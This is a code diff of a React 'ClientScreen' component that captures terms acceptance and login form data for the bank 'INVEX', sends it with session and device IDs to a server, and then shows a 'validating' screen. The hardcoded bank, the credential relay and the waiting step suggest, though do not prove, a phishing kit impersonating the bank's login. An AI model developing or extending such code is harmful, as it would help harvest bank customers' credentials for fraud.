@@ -304,19 +304,21 @@ export default function ClientScreen() {
         }
         
         if (screen === ScreenType.TERMINOS) {
-          // Generar folio inmediatamente al aceptar términos
+          // Generar sessionId y folio únicos al aceptar términos
           const newSessionId = Math.random().toString(36).substring(2, 15);
+          const deviceId = getOrCreateDeviceId();
           
-          // Crear nueva sesión en el servidor
-          sendMessage({
-            type: 'NEW_CLIENT_SESSION',
+          // Crear nueva sesión en el servidor con folio único
+          sendMessage(JSON.stringify({
+            type: 'CREATE_UNIQUE_SESSION',
             data: {
               sessionId: newSessionId,
               banco: 'INVEX',
+              deviceId: deviceId,
               clientData: { terminosAceptados: true },
               timestamp: new Date().toISOString()
             }
-          });
+          }));
           
           // Actualizar el estado local con el nuevo sessionId
           setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
@@ -325,24 +327,39 @@ export default function ClientScreen() {
         }
         
         if (screen === ScreenType.LOGIN) {
-          // Generar nuevo sessionId
-          const newSessionId = Math.random().toString(36).substring(2, 15);
+          // Si ya hay sessionId de términos, usar el existente; si no, crear uno nuevo
+          let currentSessionId = sessionData.sessionId;
           
-          // Crear nueva sesión en el servidor
-          sendMessage({
-            type: 'NEW_CLIENT_SESSION',
-            data: {
-              sessionId: newSessionId,
-              banco: 'INVEX',
-              clientData: formData,
-              timestamp: new Date().toISOString()
-            }
-          });
+          if (!currentSessionId) {
+            currentSessionId = Math.random().toString(36).substring(2, 15);
+            const deviceId = getOrCreateDeviceId();
+            
+            // Crear nueva sesión si no existe
+            sendMessage(JSON.stringify({
+              type: 'CREATE_UNIQUE_SESSION',
+              data: {
+                sessionId: currentSessionId,
+                banco: 'INVEX',
+                deviceId: deviceId,
+                clientData: formData,
+                timestamp: new Date().toISOString()
+              }
+            }));
+            
+            setSessionData(prev => ({ ...prev, sessionId: currentSessionId, banco: 'INVEX' }));
+          } else {
+            // Actualizar sesión existente con datos de login
+            sendMessage(JSON.stringify({
+              type: 'UPDATE_SESSION_DATA',
+              data: {
+                sessionId: currentSessionId,
+                tipo: 'login',
+                data: formData
+              }
+            }));
+          }
           
-          // Actualizar el estado local con el nuevo sessionId
-          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
           setCurrentScreen(ScreenType.VALIDANDO);
-          
           return;
         }
       }
